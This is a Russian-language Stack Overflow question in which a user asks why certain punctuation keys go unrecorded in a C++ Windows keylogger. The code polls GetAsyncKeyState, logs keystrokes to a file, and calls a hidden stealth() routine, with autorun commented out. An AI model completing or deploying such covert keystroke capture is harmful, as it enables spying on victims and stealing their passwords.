---
title: "Virtual-key codes, в файл не записываются несколько клавиш"
se.owner.user_id: 332316
se.owner.display_name: "Hellios"
se.owner.link: "https://ru.stackoverflow.com/users/332316/hellios"
se.link: "https://ru.stackoverflow.com/questions/963904/virtual-key-codes-%d0%b2-%d1%84%d0%b0%d0%b9%d0%bb-%d0%bd%d0%b5-%d0%b7%d0%b0%d0%bf%d0%b8%d1%81%d1%8b%d0%b2%d0%b0%d1%8e%d1%82%d1%81%d1%8f-%d0%bd%d0%b5%d1%81%d0%ba%d0%be%d0%bb%d1%8c%d0%ba%d0%be-%d0%ba%d0%bb%d0%b0%d0%b2%d0%b8%d1%88"
se.question_id: 963904
se.post_type: question
se.score: 1
---
<p>Пишу кейлоггер (в познавательных целях). Использую GetAsyncKeyState и коды клавиш. Пока использую английскую раскладку. Все клавиши записываются нормально, кроме тех, которые на скрине. Т.е. после запуска проги и жмакания по ним в текстовик ничего не записывается, но с остальными клавишами таких проблем нет. Собсна, почему так происходит? Коды не соответствуют?(проверял много раз)</p>

<pre><code>#include "pch.h"
#include &lt;iostream&gt;
#include &lt;windows.h&gt;
#include &lt;fstream&gt;
#include &lt;string&gt;


using namespace std;

bool is_capslock = false;
int BackSp = 0;

int save(int key)
{
    ofstream out_file;
    out_file.open("logs.txt", ios_base::app);
    string Logs = "";


    switch (key)
    {
    case 189:
        BackSp = 0;
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            Logs += "_";
        }
        else
            Logs += "-";
        break;
    case 187:
        BackSp = 0;
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            Logs += "+";
        }
        else
            Logs += "=";
        break;
    case 219:
        BackSp = 0;
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            Logs += "{";
        }
        else
            Logs += "[";
        break;
    case 221:
        BackSp = 0;
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            Logs += "}";
        }
        else
            Logs += "]";
        break;
    case 186:
        BackSp = 0;
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            Logs += ":";
        }
        else
            Logs += ";";
        break;
    case 222:
        BackSp = 0;
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            Logs += "\"";
        }
        else
            Logs += "'";
        break;
    case 220:
        BackSp = 0;
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            Logs += "|";
        }
        else
            Logs += "\\";
        break;
    case 188:
        BackSp = 0;
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            Logs += "&lt;";
        }
        else
            Logs += ",";
        break;
    case 190:
        BackSp = 0;
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            Logs += "&gt;";
        }
        else
            Logs += ".";
        break;
    case 191:
        BackSp = 0;
        if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
            Logs += "?";
        }
        else
            Logs += "/";
        break;
    default:
        break;
    }

    out_file &lt;&lt; Logs;
    out_file.close();
    return 0;
}

int main(int argc, char * argv[])
{
    //autorun();
    stealth();

    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);

    char i;
    while (1)
    {
        for (i = 8; i &lt;= 190; i++)
        {
            if (GetAsyncKeyState(i) == -32767)
                save(i);
        }
    }
    return(0);
}
</code></pre>

<p><a href="https://i.stack.imgur.com/sX0ny.png" rel="nofollow noreferrer"><img src="https://i.stack.imgur.com/sX0ny.png" alt="скрин"></a></p>
